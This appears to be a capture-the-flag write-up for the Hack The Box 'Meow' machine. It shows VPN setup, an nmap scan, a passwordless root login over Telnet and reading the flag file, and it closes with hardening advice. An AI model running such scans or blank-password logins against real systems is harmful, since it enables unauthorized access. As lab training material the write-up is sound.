## üß† Summary

Meow is an easy Linux machine that highlights the risks of using **Telnet** with weak or no authentication. We'll start by connecting to the HTB network using OpenVPN, enumerate services using Nmap, exploit the open Telnet service, and capture the flag.

## üõ†Ô∏è Tools Used

- **OpenVPN** ‚Äì Connect to HTB VPN
- **ping** ‚Äì Test connectivity
- **nmap** ‚Äì Scan for open ports
- **telnet** ‚Äì Remote access to the target

## üñ•Ô∏è Target Info

- IP: `10.129.28.108`
- OS: Linux
- Service: Telnet (port 23)
- Difficulty: Very Easy
- Tags: Telnet, Protocols, Reconnaissance, Weak Credentials, Misconfiguration

## üöÄ Steps to Root

### 1. Connect to HTB VPN
Use the `.ovpn` file provided by Hack The Box:

```bash
sudo openvpn file-name.ovpn
```

### 2. Verify Connectivity
Check if you can reach the target IP using ping:

```bash
ping 10.129.28.108
```

### 3. Scan the Target with Nmap
Run an Nmap scan to find open ports and services:
```bash
nmap -sV -Pn 10.129.28.108
```
Result (**telnetd** is a sign no password is needed for login):

### 4. Exploit Telnet
Since Telnet is open, connect using:
```bash
telnet 10.129.28.108
```
When asked for a username:
```bash
login: root
Password: (leave blank and press Enter)
```

### 5. Capture the Flag
Once inside:
```bash
ls -la
cat flag.txt
```
Flag:
```bash

```

### Key Takeaways:
- Telnet is insecure and should not be used on modern systems.
- Always disable Telnet and replace it with SSH.
- Never allow root login without a password.
